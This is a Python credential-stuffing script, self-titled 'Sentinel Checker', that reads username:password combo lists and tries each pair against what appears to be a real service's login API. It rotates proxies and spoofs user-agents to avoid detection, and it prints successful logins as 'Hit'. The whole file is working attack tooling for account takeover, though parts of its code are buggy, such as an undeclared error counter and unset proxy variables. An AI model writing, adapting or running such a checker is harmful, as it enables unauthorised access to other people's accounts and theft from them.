import requests,threading,random,json,sys
import ctypes


def get_useragent():
	users = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57","Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1","Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-T719 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Safari/537.36"]
	return random.choice(users)

def get_proxies():
	proxy_text = []
	with open('proxy.txt') as proxies:
		for num,line in enumerate(proxies):
			proxy_text.append(line)
	line = random.choice(proxy_text)
	ip = line.replace('\n', '')
	if str(ip).startswith('http'):
		pass
	else:
		https = "https://"+ip
		http = "http://"+ip
	proxy = {
        "https":https,
        "http":http
	}
	return proxy


def CheckCombo(username,password):
	try:
		headers = {
			"content-type": "application/json;charset=UTF-8",
			"origin": "https://dashboard.sentinel.to",
			"referer": "https://dashboard.sentinel.to/auth/login",
			'User-Agent':get_useragent()
		}
		x = {
			'username':username,
			'password':password
		}
		res = requests.post(url="https://api.sentinel.to/auth/login/credentials",headers=headers,data=json.dumps(x),proxies=get_proxies())
		if res.status_code == 401:
			return False
		else:
			return True
	except:
		print(' proxy failed')
		error += 1

ctypes.windll.kernel32.SetConsoleTitleW(f" Sentinel Checker | Akex©#0001 |")
if len(sys.argv) < 3:
	combos = []
	with open(sys.argv[1]) as combo_file:
		for cnt,line in enumerate(combo_file):
			combos.append(line)
	for combo in combos:
		user = combo.split(':')
		if CheckCombo(user[0],user[1]):
			print(f' Hit -> {combo}')
			
else:		
	print(f'Usage : python {sys.argv[0]} <combo-file>')
